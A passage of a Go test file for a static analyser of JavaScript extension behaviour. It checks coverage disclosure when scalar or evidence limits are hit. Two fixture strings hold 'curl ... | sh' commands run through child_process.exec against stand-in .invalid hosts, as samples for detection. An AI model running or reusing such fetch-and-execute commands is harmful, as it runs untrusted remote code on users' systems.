		t.Fatalf("direct command after scalar bound lost its shell pipeline: %#v", graph.Relations)
	}
	if !hasPartialCoverageArea(graph.Coverage, "javascript-process-command-analysis") {
		t.Fatalf("scalar bound was not disclosed: %#v", graph.Coverage)
	}
}

func TestExtractTextDoesNotResolveScalarOmittedAfterJavaScriptCommandBound(t *testing.T) {
	lines := []string{`const cp = require("child_process");`, `function activate() {`}
	for index := 0; index < maxJavaScriptCommandScalars; index++ {
		lines = append(lines, fmt.Sprintf(`const value%d = "part-%d";`, index, index))
	}
	lines = append(
		lines,
		`const omitted = "curl https://omitted-scalar.example.invalid/p | sh";`,
		`cp.exec(omitted);`,
		`}`,
	)

	var graph behavior.Graph
	ExtractText(&graph, javascriptCommandTestContent(strings.Join(lines, "\n")))
	if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
		t.Fatalf("omitted scalar produced semantics: operations=%#v relations=%#v", graph.Operations, graph.Relations)
	}
	if !hasPartialCoverageArea(graph.Coverage, "javascript-process-command-analysis") {
		t.Fatalf("omitted scalar was not disclosed: %#v", graph.Coverage)
	}
}

func TestExtractTextDoesNotPromoteJavaScriptCommandWhenCausalEvidenceCannotBeRetained(t *testing.T) {
	source := `const cp = require("child_process");
const command = "curl https://evidence-limit.example.invalid/p | sh";
cp.exec(command);`
	// Three text-line facts plus the subprocess command fit. The causal
	// binding/assignment proof that follows does not.
	graph := behavior.Graph{EvidenceLimit: 4}
	ExtractText(&graph, javascriptCommandTestContent(source))

	for _, operation := range graph.Operations {
		if operation.Support != behavior.SupportHeuristic {
			t.Fatalf("operation escaped incomplete causal evidence with support %q: %#v", operation.Support, operation)
		}
	}
	for _, relation := range graph.Relations {
		if relation.Support != behavior.SupportHeuristic {
			t.Fatalf("relation escaped incomplete causal evidence with support %q: %#v", relation.Support, relation)
		}
	}
	if !hasPartialCoverageArea(graph.Coverage, "javascript-process-command-analysis") {
		t.Fatalf("causal-evidence exhaustion was not disclosed: %#v", graph.Coverage)
	}
}

func javascriptCommandTestContent(source string) artifact.Content {
	return artifact.Content{
		NodeID:      "node-javascript",
		LogicalPath: "extension.js",
		Kind:        "script",
		MediaType:   "text/plain",
		Data:        []byte(source),
	}
}

func hasJavaScriptCommandEvidenceKind(values []behavior.Evidence, kind string) bool {
	for _, evidence := range values {
		if evidence.Kind == kind {
			return true
		}
	}
	return false
}

func graphHasResourceValue(graph behavior.Graph, value string) bool {
	for _, operation := range graph.Operations {
		for _, binding := range operation.ResourceBindings {
			if binding.Resource.Value == value {
				return true
			}
		}
	}
	return false
}

func hasPartialCoverageArea(values []behavior.Coverage, area string) bool {
	for _, coverage := range values {
		if coverage.AnalysisArea == area && coverage.Status == "partial" {
			return true
		}
	}
	return false
}
